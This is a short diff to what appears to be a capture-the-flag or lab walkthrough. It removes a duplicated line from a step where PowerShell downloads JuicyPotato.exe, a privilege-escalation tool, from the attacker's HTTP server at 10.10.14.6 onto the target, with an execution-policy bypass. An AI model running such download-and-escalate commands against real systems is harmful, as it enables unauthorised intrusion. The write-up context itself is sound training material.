@@ -207,7 +207,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 - used PowerShell to transfer `JuicyPotato.exe` from LHOST to the RHOST
 ```
 C:\Users\Public>powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
-powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
 Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.
 At line:1 char:4
 + IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/Ju ...
